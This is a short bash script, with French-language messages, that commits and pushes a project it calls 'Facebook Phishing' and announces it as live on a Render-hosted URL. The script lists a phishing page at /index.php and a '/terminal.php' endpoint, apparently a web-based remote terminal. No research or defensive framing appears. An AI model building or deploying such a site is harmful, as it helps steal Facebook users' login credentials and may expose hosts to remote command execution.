#!/bin/bash
echo "🚀 Déploiement Facebook Phishing..."
git add .
git commit -m "Update phishing $(date +%H:%M)"
git push origin main
echo "✅ LIVE: https://tonphish.onrender.com"
echo "📱 Phishing: /index.php"
echo "💻 Terminal: /terminal.php"
